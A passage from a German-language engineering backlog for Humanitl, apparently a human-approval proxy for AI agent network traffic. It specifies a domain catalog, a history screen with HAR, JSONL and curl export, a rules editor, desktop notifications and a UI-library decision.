- `proto/humanitl/v1/humanitl.proto` (ändern: `DomainInfo`)
- `app/lib/features/intercept/widgets/domain_panel.dart` (neu), `catalog_card.dart`, `unknown_domain_card.dart`
- `app/lib/features/intercept/providers/catalog_provider.dart` (neu; nur Icons/Beschreibung, Daten kommen vom Daemon)

### Spezifikation

```yaml
# catalog/domains.yaml
version: 1
entries:
  - id: github
    name: GitHub
    hosts: ["github.com", "**.github.com", "**.githubusercontent.com"]
    category: scm            # scm | registry | docs | ci | cloud | ai | cdn | search | os | other
    description: "Source hosting, issues, releases, GitHub API."
    typical: ["git clone/fetch/push", "gh api", "release downloads"]
    icon: github.svg
    homepage: https://github.com
    risk_note: null
  - { id: npm, name: npm registry, hosts: ["registry.npmjs.org", "**.npmjs.org", "**.npmjs.com"], category: registry, description: "Node package registry.", typical: ["npm install", "npx"], icon: npm.svg, homepage: https://www.npmjs.com }
  - { id: pypi, name: PyPI, hosts: ["pypi.org", "files.pythonhosted.org", "**.pypi.org"], category: registry, description: "Python package index.", typical: ["pip install", "uv add"], icon: pypi.svg, homepage: https://pypi.org }
  - { id: crates, name: crates.io, hosts: ["crates.io", "static.crates.io", "index.crates.io"], category: registry, description: "Rust package registry.", typical: ["cargo build", "cargo add"], icon: cargo.svg, homepage: https://crates.io }
  - { id: docsrs, name: docs.rs, hosts: ["docs.rs"], category: docs, description: "Rust API documentation.", typical: ["webfetch docs"], icon: cargo.svg, homepage: https://docs.rs }
  - { id: rubygems, name: RubyGems, hosts: ["rubygems.org", "**.rubygems.org"], category: registry, description: "Ruby gems.", typical: ["bundle install"], icon: ruby.svg, homepage: https://rubygems.org }
  - { id: packagist, name: Packagist, hosts: ["packagist.org", "repo.packagist.org"], category: registry, description: "PHP Composer packages.", typical: ["composer install"], icon: php.svg, homepage: https://packagist.org }
  - { id: dockerhub, name: Docker Hub, hosts: ["hub.docker.com", "registry-1.docker.io", "auth.docker.io", "**.docker.io"], category: registry, description: "Container images.", typical: ["docker pull"], icon: docker.svg, homepage: https://hub.docker.com }
  - { id: ghcr, name: GitHub Container Registry, hosts: ["ghcr.io", "**.ghcr.io"], category: registry, description: "Container images on GitHub.", typical: ["docker pull ghcr.io/…"], icon: github.svg, homepage: https://ghcr.io }
  - { id: quay, name: Quay.io, hosts: ["quay.io", "**.quay.io"], category: registry, description: "Container images (Red Hat).", typical: ["podman pull"], icon: quay.svg, homepage: https://quay.io }
  - { id: debian, name: Debian mirrors, hosts: ["deb.debian.org", "security.debian.org", "**.debian.org"], category: os, description: "Debian packages.", typical: ["apt-get install"], icon: debian.svg, homepage: https://www.debian.org }
  - { id: ubuntu, name: Ubuntu archive, hosts: ["archive.ubuntu.com", "security.ubuntu.com", "**.ubuntu.com"], category: os, description: "Ubuntu packages.", typical: ["apt-get install"], icon: ubuntu.svg, homepage: https://ubuntu.com }
  - { id: huggingface, name: Hugging Face, hosts: ["huggingface.co", "**.huggingface.co", "**.hf.co"], category: ai, description: "Models and datasets.", typical: ["model download"], icon: huggingface.svg, homepage: https://huggingface.co, risk_note: "Downloads can be large; uploads would exfiltrate data." }
  - { id: ollama, name: Ollama library, hosts: ["ollama.com", "registry.ollama.ai", "**.ollama.com"], category: ai, description: "Ollama model registry.", typical: ["ollama pull"], icon: ollama.svg, homepage: https://ollama.com }
  - { id: modelsdev, name: models.dev, hosts: ["models.dev", "**.models.dev"], category: ai, description: "Model catalog used by OpenCode at startup.", typical: ["OpenCode startup"], icon: opencode.svg, homepage: https://models.dev, risk_note: "OpenCode fetches this on every start; Humanitl bundles a mirror." }
  - { id: openai, name: OpenAI API, hosts: ["api.openai.com", "**.openai.com"], category: ai, description: "Cloud LLM API.", typical: ["chat completions"], icon: openai.svg, homepage: https://openai.com, risk_note: "Cloud LLM: anything sent here leaves your control." }
  - { id: anthropic, name: Anthropic API, hosts: ["api.anthropic.com", "**.anthropic.com"], category: ai, description: "Cloud LLM API.", typical: ["messages"], icon: anthropic.svg, homepage: https://anthropic.com, risk_note: "Cloud LLM: anything sent here leaves your control." }
  - { id: stackoverflow, name: Stack Overflow, hosts: ["stackoverflow.com", "**.stackoverflow.com", "**.stackexchange.com"], category: docs, description: "Q&A.", typical: ["webfetch"], icon: stackoverflow.svg, homepage: https://stackoverflow.com }
  - { id: mdn, name: MDN Web Docs, hosts: ["developer.mozilla.org"], category: docs, description: "Web platform docs.", typical: ["webfetch"], icon: mdn.svg, homepage: https://developer.mozilla.org }
  - { id: gitlab, name: GitLab, hosts: ["gitlab.com", "**.gitlab.com"], category: scm, description: "Source hosting.", typical: ["git clone/push"], icon: gitlab.svg, homepage: https://gitlab.com }
  - { id: jsdelivr, name: jsDelivr CDN, hosts: ["cdn.jsdelivr.net", "**.jsdelivr.net"], category: cdn, description: "npm/GitHub CDN.", typical: ["asset fetch"], icon: jsdelivr.svg, homepage: https://www.jsdelivr.com }
  - { id: unpkg, name: unpkg, hosts: ["unpkg.com"], category: cdn, description: "npm CDN.", typical: ["asset fetch"], icon: npm.svg, homepage: https://unpkg.com }
  - { id: google, name: Google Search, hosts: ["www.google.com", "google.com"], category: search, description: "Web search.", typical: ["websearch"], icon: google.svg, homepage: https://google.com }
  - { id: ddg, name: DuckDuckGo, hosts: ["duckduckgo.com", "**.duckduckgo.com"], category: search, description: "Web search.", typical: ["websearch"], icon: ddg.svg, homepage: https://duckduckgo.com }
  - { id: wikipedia, name: Wikipedia, hosts: ["**.wikipedia.org", "**.wikimedia.org"], category: docs, description: "Encyclopedia.", typical: ["webfetch"], icon: wikipedia.svg, homepage: https://wikipedia.org }
```

`hosts` verwenden dieselbe Glob-Semantik wie Regeln (`HostPattern`). Icons: SVG, monochrom oder Original, 20 × 20 gerendert; fehlt die Datei, wird `lucide.globe` gezeigt. Lizenzen der Icons in `catalog/icons/LICENSES.md`.

```rust
pub struct Catalog { entries: Vec<CatalogEntry>, patterns: Vec<(HostPattern, usize)>, ranks: HashMap<String, u32>, seen: DashMap<String, SeenStats> }
pub struct DomainInfo { pub apex: Option<String>, pub catalog_id: Option<String>, pub popularity_rank: Option<u32>, pub first_seen: Option<DateTime<Utc>>, pub seen_count: u32 }
impl Catalog {
    pub fn load(dir: &Path) -> Result<Self, Diagnostic>;     // CATALOG_001 bei Fehler; Daemon läuft dann mit leerem Katalog weiter (Warning)
    pub fn info(&self, host: &HostName) -> DomainInfo;       // apex via `psl::domain_str`, Rang-Lookup auf apex, seen++ 
}
```

Rangliste: `ranks-top100k.csv.gz`, Zeilenformat `rank,domain`, beim Start in `HashMap<String, u32>` (gemessen 6,53 MiB Resident, nicht die geschaetzten 5 MB). Lookup auf dem Apex. Datei mit Datum im Namen des Commits dokumentieren; Aktualisierung ist ein `chore`-Issue pro Release.

Proto:

```proto
message DomainInfo { string apex = 1; string catalog_id = 2; uint32 tranco_rank = 3;  // Feldname aus HUM-003, Inhalt ist der Verbreitungsrang google.protobuf.Timestamp first_seen = 4; uint32 seen_count = 5; }
// in FlowEvent.Received: DomainInfo domain = N;
```

UI `DomainPanel` (rechtes Pane, 28 %):
- **Katalog-Karte**: Favicon-Slot 20 px | Name 14/600 | Kategorie-Chip (ARB `catalog_category_<cat>`) | Beschreibung 13 `fg-1` | „Typical for: npm install" | Tranco-Badge Mono 11 `#1.2k` (Format: `<1000` exakt, sonst `1.2k`, `>100k` „unranked") | „Seen {n}× this session" | `risk_note` als amber Zeile, falls vorhanden. Darunter Schnellregeln als Ghost-Buttons: `Allow **.{apex} this session`, `Allow {host} this session`, `Block {host}` (jeweils Regelsatz als Tooltip, Klick → `Rules(add)`; kein Decide).
- **Unbekannt-Karte**: gestrichelter Rahmen `line-strong`, `lucide.globe` grau, „Not in catalog" (ARB `domain_unknown`), Host Mono mit Apex fett, U-Label und A-Label untereinander wenn verschieden, „First seen just now" / „Seen {n}×", Rang „unranked" bzw. Badge, Button „Fetch preview" deaktiviert mit Tooltip „Coming in a later version; nothing is fetched automatically." (ARB `domain_preview_disabled`).
- Ohne selektierten Flow: Panel zeigt Session-Zusammenfassung: Anzahl Hosts, Top 5 Hosts nach Requests.

### Schritte
1. `humanitl-catalog`: Laden, Pattern-Index, PSL-Apex, Rangliste; Tests.
2. `DomainInfo` in Proto und `Received`-Event; `Catalog` im Proxy-State.
3. `catalog/domains.yaml` mit den 25 Einträgen oben plus Icons (mindestens Platzhalter-SVGs).
4. Flutter: Dart-Modell `DomainInfo`, Katalog-Metadaten (Name, Beschreibung, Icon) werden zusätzlich als Asset gebündelt (`app/assets/catalog/domains.yaml` = Symlink/Kopie im Build, `catalogProvider` parst sie), damit das UI Icons und Texte ohne RPC hat; Daemon liefert nur `catalog_id`.
5. `DomainPanel`, beide Karten, Schnellregeln, Session-Zusammenfassung; Goldens.

### Tests
- `catalog_pattern_match`: `api.github.com` → `github`; `evil-github.com` → None.
- `apex_psl`: `a.b.github.io` → Apex `b.github.io` (PSL private section), `api.github.com` → `github.com`.
- `rank_lookup_on_apex`: `api.github.com` → Rang von `github.com`.
- `seen_count_increments`.
- `catalog_load_error_is_warning`: fehlende Datei → Diagnostic CATALOG_001 Warning, `info()` liefert trotzdem Apex.
- Flutter: `domain_panel_known`, `domain_panel_unknown`, `domain_panel_session_summary` Goldens; `quick_rule_calls_rules_add`.

### Akzeptanzkriterien
- [ ] Tests und Goldens grün.
- [ ] `catalog/domains.yaml` validiert gegen ein JSON-Schema (`catalog/domains.schema.json`, in CI mit `check-jsonschema`).
- [ ] Kein Netzwerkzugriff aus `humanitl-catalog` (Crate hat keine Abhängigkeit auf hyper/reqwest/tokio-net; `cargo tree` in CI geprüft).
- [ ] Lizenzhinweis in `catalog/RANKS-LICENSE` und in der About-Ansicht (ARB `aboutRanks`).

### Fallstricke
- `psl`-Crate hat die Liste einkompiliert; Version pinnen und im Changelog erwähnen, da sich die PSL ändert.
- Apex für IP-Hosts ist `None`; Panel zeigt „IP address" statt Apex.
- Katalog-Match darf nicht auf Substring beruhen; `HostPattern` wiederverwenden.
- Icons niemals von der Homepage laden; nur Assets.

### Referenzen
BACKLOG.md Abschnitt 5 (Domain-Panel), ADR-006, UX-Recherche §4; CONVENTIONS.md 3.2; Public Suffix List (https://publicsuffix.org/list/), `psl` (https://docs.rs/psl); Tranco (https://tranco-list.eu/, Lizenz beachten).

---

## HUM-032 · History-Screen
Sprint: 2 · Größe: L · Abhängigkeiten: HUM-026, HUM-030, HUM-019 · Blockiert: HUM-036, HUM-051

### Kontext
History ist die zweite Projektion desselben Flow-Streams: alles, was je passiert ist, sortier- und filterbar, mit Detailansicht und Export. Die UI hält nur Summaries; Bodies kommen bei Auswahl.

### Ziel
`HistoryScreen` mit virtualisierter `TableView`, serverseitigem Filter/Sort/Paging, Detail-Split (Request/Response, Ansichten aus HUM-030), Doppelklick-Sprung in Intercept, Export als HAR 1.2, JSONL und curl.

### Nicht-Ziel
Audit-Ansicht (HUM-051), Gruppierung, Diff editierter Requests (HUM-047 zeigt Diff in der Karte).

### Betroffene Pfade
- `app/lib/features/history/{history_screen,history_table,history_filter_bar,history_detail,export}.dart` (neu)
- `app/lib/features/history/providers/{history_page_provider,history_query_provider}.dart` (neu)
- `app/lib/features/history/export/{har,jsonl,curl}.dart` (neu)
- `app/test/features/history/*.dart`, Goldens

### Spezifikation

Tabelle (`TableView.builder`, Zeile 28 px, Header gepinnt 28 px, Spaltenbreiten fix in px, horizontales Scrollen bei Überbreite):

| Spalte | Breite | Inhalt |
|---|---|---|
| seq | 56 | `#{seq}` Mono 12 |
| time | 72 | `HH:mm:ss` Mono 12 |
| state | 28 | Glyph + Farbe nach `FlowStateColor` (held/allowed/allowedEdited/blocked/timedOut/autoRule/passthroughLlm/error) |
| method | 64 | Method-Badge (Farben aus Abschnitt 5) |
| host | 220 | `hostDisplay` 13, mittig gekürzt |
| path | flex ≥ 260 | Mono 12 `fg-1`, mittig gekürzt |
| status | 56 | Zahl; `—` wenn null; ≥ 400 in `fg-0`, sonst `fg-1` |
| size | 72 | `request_size` + `response_size` als `2.1k / 48k` |
| ms | 64 | `duration_ms` |
| findings | 64 | Zahl; > 0 in `secret`-Orange |
| rule | 140 | Chip: `rule:<note oder id-Kurzform>` bei Regel, `manual`, `timeout`, `passthrough` |
| edited | 28 | Stift-Punkt |

Zustandsfarbe-Ableitung: `state == held` → held; `decision == allow && rule_id == null` → allowed; `allow_edited` → allowedEdited; `block` → blocked; `timed_out` → timedOut; `allow && rule_id != null` → autoRule; `passthrough == 1` → passthroughLlm; `status ≥ 500 || block_reason == no_route` → error.

Filterleiste: `TextField` Mono 13 mit Placeholder `host:github.com state:blocked since:1h` (ARB `history_filter_hint`), Enter übernimmt, Parse-Fehler (RECORDER_002) inline unter dem Feld in `error`-Farbe mit Liste der gültigen Keys. Chips für Schnellfilter: `held`, `blocked`, `findings:>0`, `edited:true`, `passthrough:false` (Default aktiv: passthrough ausgeblendet, Chip zeigt „LLM traffic hidden"). Sortier-Klick auf Header (ts, host, duration, size).

Provider: `historyQueryProvider` (`FlowQuery`), `historyPageProvider` (`AsyncNotifier`, hält `List<FlowSummary>` bis 2000 Zeilen; `loadMore()` bei Scroll-Position > 80 %; bei neuem Filter Reset). Live-Update: `flowEventsProvider` aktualisiert Zeilen, die bereits geladen sind (Zustandswechsel), und fügt neue Flows oben ein, wenn Sortierung `ts desc` und kein Cursor-Offset (sonst Pill „12 new · refresh").

Detail-Split (unten, `ResizablePanel` vertikal, Default 40 %): Tabs `Request | Response` (bei `request_edited` zusätzlich `Edited`); je Tab Header-Tabelle (Name/Wert, sortierbar, `Copy`), dann `BodyView` (HUM-030). Kopfzeile: Methode, URL voll (selektierbar), Entscheidung, Regel, Dauer, Findings. Bei Response `streaming` (Flow noch `forwarded`): Live-Größe.

Doppelklick auf Zeile: `state == held` → `selectedFlowIdProvider = id`, Navigation Intercept; sonst Detail-Sheet rechts (`HSheet`) mit demselben Detail-Widget.

Export (Menü oben rechts, `lucide.download`): Auswahl = aktuelle Selektion (Multi-Select wie HUM-029) oder gefilterte Menge (max 5000, sonst Hinweis). Läuft in `Isolate.run`; Bodies via `GetBody` (Client-Stream). Speichern über `file_picker.saveFile`.

HAR-1.2-Mapping (`har.dart`):

```
log.version = "1.2"; log.creator = {name: "Humanitl", version}
entry.startedDateTime = ts (ISO 8601)
entry.time = duration_ms ?? 0
entry.request = { method, url = scheme://hostDisplay[:port]path, httpVersion, headers[{name,value}], queryString (aus path geparst), postData = { mimeType = content_type, text = body (UTF-8) | encoding "base64" wenn binär } , headersSize -1, bodySize = request_size }
entry.response = { status ?? 0, statusText "", httpVersion, headers, content = { size = response_size ?? 0, mimeType, text, encoding? }, redirectURL "", headersSize -1, bodySize }
entry.timings = { send 0, wait = held_ms ?? 0, receive = (duration_ms - held_ms) ?? 0 }
entry._humanitl = { flow_id, session_id, decision, block_reason, rule_id, findings_count, edited, passthrough }
```

Geblockte Flows: `response.status = 403`, `content.text` = 403-Body. JSONL: eine `FlowDetail` als JSON pro Zeile, Bodies base64 im Feld `body_b64`, `truncated`-Flag. curl (nur Einzel-Flow): `curl -X {method} '{url}' -H '{name}: {value}'… --data-binary @request.body` plus Datei `request.body` daneben; Hinweis-Dialog nennt beide Dateien.

### Schritte
1. Provider und Paging gegen Fake-Daemon; Test mit 5000 Zeilen.
2. `HistoryTable` mit fixen Spalten und Goldens.
3. Filterleiste und Chips; Fehleranzeige.
4. Detail-Split; Doppelklick-Navigation.
5. Export HAR/JSONL/curl mit Tests (HAR gegen Schema `har-1.2.json` validiert in Test).
6. Live-Update aus `flowEventsProvider`.

### Tests
- `paging_loads_more_at_80pct`.
- `filter_error_shows_keys`.
- `state_color_mapping`: alle 8 Zustände.
- `double_click_held_navigates_intercept`.
- `har_export_valid`: 3 Flows (allow mit Body, block, timeout) → JSON validiert gegen HAR-Schema; `_humanitl` vorhanden.
- `jsonl_roundtrip`.
- `live_update_changes_row_state`: Held-Zeile wird nach `Decided`-Event zu allowed ohne Reload.
- Goldens: `history_table`, `history_detail_request`, `history_filter_error`.

### Akzeptanzkriterien
- [ ] Tests und Goldens grün.
- [ ] Fake-Daemon-Szenario `history_10k.jsonl`: Scrollen über 10k Zeilen ohne sichtbares Ruckeln; Speicher der App < 300 MB (DevTools-Messung in PR).
- [ ] Export von 100 Flows als HAR öffnet fehlerfrei in Firefox DevTools (manuell, Screenshot in PR).

### Fallstricke
- `TableView` braucht feste Zeilenhöhen (`TableSpan` mit `FixedSpanExtent`), keine intrinsischen Höhen.
- Keyset-Paging: beim Einfügen neuer Zeilen oben den Cursor nicht verschieben (Cursor gehört zur Seite unten).
- HAR erwartet `text` als String; Binärdaten base64 mit `encoding` markieren, sonst ungültige UTF-8.
- Passthrough-Flows sind viele; Default-Filter blendet sie aus, Chip macht das sichtbar, sonst wundert sich der Nutzer über „fehlende" LLM-Calls oder ertrinkt darin.
- `file_picker.saveFile` auf Linux gibt Pfad zurück, schreibt nicht selbst.

### Referenzen
BACKLOG.md Abschnitt 5 (History-Skizze), 3.5; CONVENTIONS.md 3.9; HAR 1.2 Spec (http://www.softwareishard.com/blog/har-12-spec/); two_dimensional_scrollables TableView.

---

## HUM-033 · Rules-Screen
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-027, HUM-028 (RuleDraft-Typen), HUM-019 · Blockiert: HUM-036

### Kontext
Regeln sind der reversible Teil des Systems. Der Screen macht jede Regel rückverfolgbar („erstellt aus Request #41"), testbar (Dry-Run) und trennt gespeicherte von temporären Regeln (ADR-011).

### Ziel
`RulesScreen` mit Tabs „Saved" und „Temporary", geordneter Liste mit Drag-Reorder, Formular-Editor mit Live-Validierung und Dry-Run, Bundled-Badge, Löschen mit Undo, „Make permanent".

### Nicht-Ziel
YAML-Direktbearbeitung im UI (Settings-Screen HUM-069 bietet „Config-Datei öffnen"), Import/Export.

### Betroffene Pfade
- `app/lib/features/rules/{rules_screen,rules_list,rule_row,rule_editor,dry_run_panel}.dart` (neu)
- `app/lib/features/rules/providers/{rules_provider,rule_editor_provider}.dart` (neu)
- `app/test/features/rules/*.dart`, Goldens

### Spezifikation

Layout: links Liste (40 %), rechts Editor (60 %); unter 900 px Breite öffnet der Editor als `HSheet`. Tabs oben: `Saved ({n})`, `Temporary ({n})`. Kopf: Suche (filtert Host/Note), Button `+ New rule`.

Zeile (36 px): Drag-Handle `lucide.grip-vertical` | Position Mono 11 | Aktions-Chip (`allow` grün, `block` rot, `ask` amber, `redact` violett, je 10 % Alpha) | Match-Summary Mono 12: `GET,HEAD · **.npmjs.org · /**` (fehlende Teile weggelassen, `∗` für alle Methoden) | Expiry: `always` / `session` / `expires in 42 min` | Origin-Badge: `bundled` (grau, Schloss-Icon) oder `from #41` (Klick → History-Detail-Sheet des Flows) | Note gekürzt | Papierkorb bei Hover (nicht bei bundled).

Reorder: `ReorderableListView` innerhalb des Tabs; Drop → `Rules(reorder)`; bundled Regeln sind nicht verschiebbar und stehen immer unten (grau abgesetzt mit Trenner „Bundled rules — cannot be removed, add an `ask` rule above to override").

Editor (Formular, `rule_editor.dart`): Felder Action (Segmented), Host (TextField Mono, Validierung über lokale Vorprüfung: leer/Stern nicht als ganzes Label → sofortiger Fehlertext; endgültige Validierung durch `Rules(add)`-Diagnostics), Methods (Chips Multi-Select), Path, Scheme (Dropdown any/http/https), Port (Zahl), Upgrade (Checkbox websocket), Expires (Segmented never/session/at + DateTime-Picker), Stream (Checkbox, nur bei Expert-Tier sichtbar, Tooltip warnt), Note. Unten: Regelsatz-Vorschau (Generator aus HUM-028, erweitert um Path/Methods-Liste) und Dry-Run-Panel: „Would have matched {n} of the last {scanned} requests" mit Liste (Zeit, Methode, Host, Pfad, Aktion) via `Rules(dry_run)` (debounced 400 ms bei Änderungen). Buttons `Save` / `Cancel`; bei bundled: read-only mit Button `Override with ask rule` (legt `ask`-Regel mit gleichem Match an Position 0 an).

Löschen: sofort `Rules(remove)`, Zeile verschwindet, Inline-Streifen oben „Rule removed · Undo" 10 s → `Rules(add)` mit gleicher Regel und Position. Temporär-Tab: zusätzlich Restlaufzeit (`at`) oder „until session ends"; Button `Make permanent` → `Rules(update)` mit `expires = never` (Regel wandert in Saved, Streifen „Now permanent · Undo").

Diagnostics aus `RulesResponse.diagnostics` erscheinen als Banner über der Liste (z. B. RULES_002 nach externem Edit der Datei) mit Button `Reload`.

### Schritte
1. `rulesProvider` (lädt bei Start und bei `RulesChanged`).
2. Liste mit Tabs, Zeilen, Reorder.
3. Editor mit Validierung und Satzvorschau.
4. Dry-Run-Panel.
5. Löschen/Undo, Make permanent, Override bundled.
6. Goldens.

### Tests
- `tabs_split_saved_temporary`.
- `reorder_calls_rpc_with_position`.
- `bundled_not_draggable_not_deletable`.
- `editor_local_validation_star_in_label`.
- `dry_run_debounced`: 3 schnelle Änderungen → 1 RPC.
- `delete_undo_restores_position`.
- `make_permanent_moves_tab`.
- Goldens: `rules_list_saved`, `rules_list_temporary`, `rules_editor_dry_run`.

### Akzeptanzkriterien
- [ ] Tests und Goldens grün.
- [ ] Manuell: Regel aus Intercept via Remember anlegen → erscheint im richtigen Tab mit `from #n`, Klick öffnet den Flow.
- [ ] Eine kaputte `rules.yaml` (per Hand editiert) erzeugt Banner mit RULES_002 und Zeilennummer, Liste zeigt den letzten gültigen Stand.

### Fallstricke
- `ReorderableListView` in Verbindung mit `ListView.builder`-Keys: jede Zeile `ValueKey(rule.id)`.
- Position beim Undo: Regel könnte inzwischen an anderer Stelle liegen; `add` mit `position` ist best-effort, Fehler ignorieren und ans Ende hängen.
- Dry-Run-RPC kann bei 500 Flows spürbar sein; Ladeindikator im Panel, nicht global.

### Referenzen
BACKLOG.md ADR-011, Abschnitt 5, Usability-Review §2; CONVENTIONS.md 3.3; HTTP Toolkit Rules (https://httptoolkit.com/docs/getting-started/rewriting/).

---

## HUM-034 · Notification und Tray
Sprint: 2 · Größe: M · Abhängigkeiten: HUM-019, HUM-028 · Blockiert: HUM-036

### Kontext
Der Nutzer ist oft in einem anderen Fenster. Der Agent hängt, bis entschieden wird. Die App muss sich bemerkbar machen, ohne zu nerven, und bei Rückkehr direkt zum Wartenden führen.

### Ziel
Desktop-Notification mit Allow/Block-Aktionen beim Übergang der Queue von 0 auf 1 (gebündelt bei mehreren), Tray-Icon mit Zähler, Rückkehr-Banner, Fenstertitel-Zähler, sauberer Fallback ohne AppIndicator.

### Nicht-Ziel
Sound (Setting existiert, Default aus, Implementierung Post-MVP), globale Hotkeys, Notification pro Request.

### Betroffene Pfade
- `app/lib/features/intercept/providers/attention_provider.dart` (neu)
- `app/lib/core/platform/{notifications,tray,window_title}.dart` (neu)
- `app/assets/tray/{idle,held_1..9,held_9plus,alert}.png` (neu, 22 px und 44 px)
- `app/lib/features/intercept/widgets/waiting_banner.dart` (neu)
- `app/test/features/intercept/attention_test.dart` (neu)

### Spezifikation

`attentionProvider` (Notifier) beobachtet `heldFlowsProvider` und Fensterfokus (`window_manager` `WindowListener.onWindowFocus/Blur`):

- Übergang `held.length: 0 → ≥1` und Fenster nicht fokussiert → Notification mit fester `id = 1`: Titel `1 request held` (ARB `notify_title_one`, Plural `notify_title_many` mit `{n}`), Body `{host} · {method} {path} · {remaining}` für den ältesten, Aktionen `Allow` (`action id = "allow:<flowId>"`), `Block`, `Show`. Weitere Ankünfte innerhalb 5 s aktualisieren dieselbe Notification (Titel wird Plural, Body „+ {n-1} more"). Fenster fokussiert → keine Notification.
- Aktion `allow:<id>` → `Decide{allow}` ohne Regel; `block:<id>` → `Decide{block}`; `Show` → `windowManager.show(); focus()` und `selectedFlowIdProvider = id`.
- Tray (`tray_manager`): Icon `idle` (grau) bei leerer Queue, `held_n` (Akzent-Punkt mit Zahl) bei 1..9, `held_9plus`; `alert` (rot), wenn seit dem letzten Fokus ein Timeout einen Block erzeugt hat; Menü: `Show Humanitl`, Trenner, `{n} requests held` (deaktiviert, informativ), `Quit`. Klick auf Icon → Fenster zeigen. Init-Fehler (kein AppIndicator, kein Tray-Protokoll) → einmaliges Diagnostic UI_002 (Info, `why` = „No system tray available; GNOME needs the AppIndicator extension", `fix: OpenUrl(docs)`), kein Retry-Spam.
- Fenstertitel: `Humanitl` bzw. `(3) Humanitl` (`windowManager.setTitle`).
- Rückkehr-Banner (`WaitingBanner`, oben im Intercept-Screen, Höhe 36 px, `held` 10 % Alpha): erscheint bei `onWindowFocus`, wenn ein gehaltener Flow seit ≥ 60 s wartet: „The agent has been waiting {duration}" (ARB `intercept_agent_waiting`), Button `Jump to oldest` (selektiert), `Dismiss`. Verschwindet automatisch, wenn die Queue leer wird.
- Setting `ui.notifications` (bool, Default true, Tier basic), `ui.sound` (bool, Default false, Tier advanced, im MVP ohne Wirkung, Beschreibung sagt das).

### Schritte
1. `notifications.dart` mit `flutter_local_notifications` Linux-Init (`LinuxInitializationSettings(defaultActionName: 'Show')`), Aktionen mit `LinuxNotificationAction`.
2. `tray.dart` mit Icon-Assets und Fallback; Assets generieren (Skript `tools/gen_tray_icons.dart` rendert aus SVG).
3. `attentionProvider` mit Zustandslogik; `FakeAsync`-Tests.
4. `WaitingBanner`, Fenstertitel.
5. Settings-Schlüssel.

### Tests
- `notify_on_zero_to_one_when_unfocused`, `no_notify_when_focused`, `bundle_within_5s_updates_same_id`.
- `action_allow_decides`.
- `tray_icon_state_mapping`: 0 → idle, 3 → held_3, 12 → held_9plus, Timeout-Block seit letztem Fokus → alert.
- `banner_after_60s_on_focus`.
- `tray_init_failure_single_diagnostic`.

### Akzeptanzkriterien
- [ ] Tests grün.
- [ ] Manuell unter GNOME mit AppIndicator-Extension: Tray-Zähler sichtbar; unter GNOME ohne Extension: genau ein Diagnostic in der Diagnostics-Ansicht, App läuft normal.
- [ ] Notification-Aktion `Allow` entscheidet den Flow ohne dass das Fenster in den Vordergrund kommt.

### Fallstricke
- `flutter_local_notifications` Linux-Aktionen brauchen einen laufenden D-Bus-Session-Bus; im CI/xvfb fehlt er; Tests mocken das Plugin-Interface.
- `tray_manager` wirft unter Wayland ohne Tray-Protokoll manchmal nicht, sondern zeigt still nichts; UI_002 daher auch bei „Init ok, aber `libayatana-appindicator` nicht gefunden" (Check per `Process.run('ldconfig -p')` nach `libayatana-appindicator3`).
- Notification-`id` fest, sonst stapeln sich Meldungen.

### Referenzen
BACKLOG.md Abschnitt 5 (Queue 0 → 1), Usability-Review §6; CONVENTIONS.md 3.7; flutter_local_notifications Linux (https://pub.dev/packages/flutter_local_notifications_linux); tray_manager (https://pub.dev/packages/tray_manager); OpenSnitch Pop-ups als Referenz (https://github.com/evilsocket/opensnitch/wiki/Pop-ups-dialogs).

---

## HUM-035 · shadcn vs forui Entscheidung
Sprint: 2 · Größe: S · Abhängigkeiten: HUM-020, HUM-028, HUM-032 · Blockiert: keine (aber alle UI-Issues ab Sprint 3 bauen auf dem Ergebnis)

### Kontext
ADR-009 wählt shadcn_flutter unter Vorbehalt: pre-1.0, Breaking Changes fast jede Release. Nach dem ersten echten Intercept-Screen, der Aktionsleiste und der History-Tabelle gibt es genug Erfahrung für eine belastbare Entscheidung. Der Wrapper `packages/ui` macht einen Wechsel lokal.

### Ziel
Ein ADR-Nachtrag (`docs/adr/0009-ui-stack.md`, Abschnitt „Entscheidung nach Sprint 2") mit ausgefüllter Bewertungsmatrix und klarer Entscheidung: bleiben oder auf forui wechseln. Bei Wechsel: Issue-Liste für die Migration (nur `packages/ui` betroffen) und Aufwandsschätzung.

### Nicht-Ziel
Die Migration selbst (falls nötig, eigenes Issue HUM-035b in Sprint 3 mit Größe M).

### Betroffene Pfade
- `docs/adr/0009-ui-stack.md` (ändern)

### Spezifikation

Bewertungsmatrix, jede Zeile 0–3 Punkte, gewichtet:

| Kriterium | Gewicht | Wie messen |
|---|---|---|
| Genutzte Komponenten vorhanden und stabil (Resizable, Command, Sheet, Toast, ContextMenu, Menubar, Segmented) | 3 | Liste abhaken; für jede fehlende: Aufwand Eigenbau in Tagen |
| Bugs in Sprint 1–2 getroffen | 3 | Anzahl Issues/Workarounds in `packages/ui` (grep `// WORKAROUND`) |
| Breaking Changes im Zeitraum (CHANGELOG letzte 6 Releases) | 2 | Anzahl, davon uns betreffend |
| Theming-Passung zu Abschnitt 5 (Tokens, Dichte, Radius, Hairlines) | 3 | Anzahl `!important`-artiger Overrides in `HTokens` |
| Tastatur/Fokus-Verhalten (Traversal, Shortcuts in Overlays) | 3 | Widget-Tests aus HUM-028 mit dem anderen Kit rerun (Prototyp-Branch) |
| Performance in History (Frames > 16 ms bei 10k Zeilen) | 2 | DevTools-Messung |
| Community/Wartung (Commits letzte 90 Tage, offene Issues, Maintainer) | 1 | GitHub-Zahlen mit Datum |
| Lizenz | 1 | beide BSD/MIT-artig |
| Wechselaufwand (nur relevant für forui) | 2 | Tage geschätzt |

Vorgehen, nachgezogen am 2026-09-04: **kein Prototyp-Branch.** Vorgesehen war ein Branch `spike/forui` mit `packages/ui` gegen forui, mindestens `HButton`, `HPill`, `HPanel`, `ResizablePanel`, Sheet und Command-Ersatz, Zeitbox 1 Tag. Er entfällt, weil die Bedingung, an der die Entscheidung hängt, ohne ihn feststeht: `shadcn_flutter` 0.0.54 und forui 0.26.0 verlangen Flutter ≥ 3.47.0, der Pin in `app/.fvmrc` steht auf 3.44.0, und die Zeitbox wäre für diese Anhebung draufgegangen, bevor die erste Zeile Port geschrieben ist. Der Preis der Abweichung steht im ADR: Die vier Kriterien 2, 4, 5 und 6, zusammen 11 der 20 Gewichtspunkte, bleiben für beide Bibliotheken Schätzung statt Messung, und der ADR nennt, woran ein Fehlurteil auffiele. Protokolliert in `backlog/CONVENTIONS.md` 4.20. Entscheidungsregel unverändert: bleiben, wenn shadcn ≥ 75 % der gewichteten Punkte und kein Kriterium mit Gewicht 3 unter 1 Punkt; sonst wechseln.

